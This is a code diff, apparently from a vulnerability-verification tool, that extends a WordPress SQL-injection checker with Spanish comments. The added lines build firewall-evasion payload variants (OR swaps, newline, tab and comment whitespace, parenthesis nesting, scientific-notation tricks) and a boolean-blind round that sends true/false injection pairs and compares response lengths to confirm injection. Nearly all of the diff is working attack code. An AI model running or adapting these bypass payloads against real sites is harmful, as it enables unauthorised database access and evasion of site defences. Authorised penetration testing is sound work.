@@ -7920,6 +7920,16 @@ def verify_wordpress_sqli(
                 variants.append(f"{orig}{ctx} AND {fn_char}{cm}")
             # 6. Double URL-encoded injection prefix (for endpoints that URL-decode twice)
             variants.append(f"{orig}{ctx}%20AND%20{fn}{cm}")
+            # 7. Parenthesis nesting bypass: AND (1=1 AND extractvalue...)
+            variants.append(f"{orig}{ctx} AND (1=1 AND {fn}){cm}")
+            # 8. Use OR instead of AND (some WAFs only block AND)
+            variants.append(f"{orig}{ctx} OR {fn}{cm}")
+            # 9. Newline whitespace bypass (%0a = newline, some WAFs tokenize by space only)
+            variants.append(f"{orig}{ctx}%0aAND%0a{fn}{cm}")
+            # 10. Scientific notation context confusion: 1e0 = 1 in MySQL
+            fn_e0 = fn.replace("1,concat", "1e0,concat")
+            if fn_e0 != fn:
+                variants.append(f"{orig}{ctx} AND {fn_e0}{cm}")
             # Remove exact duplicates and the base payload (already tried)
             seen = {base}
             result = []
@@ -7927,7 +7937,7 @@ def verify_wordpress_sqli(
                 if v not in seen:
                     seen.add(v)
                     result.append(v)
-            return result[:6]  # cap at 6 per combination to bound budget
+            return result[:10]  # cap at 10 per combination to bound budget
 
         def _sqli_encode_variants(payload: str) -> list:
             """
@@ -8710,6 +8720,55 @@ def verify_wordpress_sqli(
                 res.evidence["screenshots"] = boot.shots
                 res.evidence["http_captures"] = boot.http_captures
                 return res
+
+        # WAF bypass round for boolean-blind: if standard pairs failed and budget allows,
+        # try obfuscated variants: comment-separated keywords, hex-encoded whitespace, etc.
+        _waf_bool_budget_ok = consistent_diffs == 0 and (budget_s - (time.time() - t0)) > 60
+        if _waf_bool_budget_ok:
+            step("boolean-blind estandar fallo — intentando variantes WAF-bypass en bool-blind...")
+            _waf_bool_pairs = []
+            for _orig_true, _orig_false in pairs[:3]:  # only first 3 pairs as WAF base
+                # Comment-separated AND
+                _waf_bool_pairs.append((
+                    _orig_true.replace(" AND ", "/**/AND/**/"),
+                    _orig_false.replace(" AND ", "/**/AND/**/"),
+                ))
+                # Tab whitespace
+                _waf_bool_pairs.append((
+                    _orig_true.replace(" AND ", "\tAND\t").replace(" OR ", "\tOR\t"),
+                    _orig_false.replace(" AND ", "\tAND\t").replace(" OR ", "\tOR\t"),
+                ))
+                # Newline bypass
+                _waf_bool_pairs.append((
+                    _orig_true.replace(" AND ", "%0aAND%0a"),
+                    _orig_false.replace(" AND ", "%0aAND%0a"),
+                ))
+                # Parenthesis nesting: AND (1=1) vs AND (1=2)
+                _waf_bool_pairs.append((
+                    _orig_true.replace("1=1", "(1=1)").replace("1=2", "(1=1)"),
+                    _orig_false.replace("1=2", "(1=2)"),
+                ))
+            for _wt, _wf in _waf_bool_pairs:
+                try:
+                    _rtwaf = send(_wt); _rfwaf = send(_wf)
+                    _ltwaf = len(_rtwaf.text or ""); _lfwaf = len(_rfwaf.text or "")
+                    _thresh = max(0.5, 0.05 * base_len) if base_len < 100 else max(20, 0.05 * base_len)
+                    if abs(_ltwaf - _lfwaf) > _thresh:
+                        consistent_diffs += 1
+                        bool_tried.append({"true": _wt, "false": _wf,
+                                           "status_true": _rtwaf.status_code,
+                                           "status_false": _rfwaf.status_code,
+                                           "len_true": _ltwaf, "len_false": _lfwaf,
+                                           "difiere": True, "true_coincide_con_base": abs(_ltwaf - base_len) <= _thresh,
+                                           "false_coincide_con_base": abs(_lfwaf - base_len) <= _thresh,
+                                           "waf_bypass": True,
+                                           "respuesta_true_recorte": (_rtwaf.text or "")[:300]})
+                        if consistent_diffs >= 2:
+                            break
+                except Exception:
+                    continue
+            if consistent_diffs >= 2:
+                step(f"WAF bypass exitoso en boolean-blind: {consistent_diffs} pares diferenciales")
 
         # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
         # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
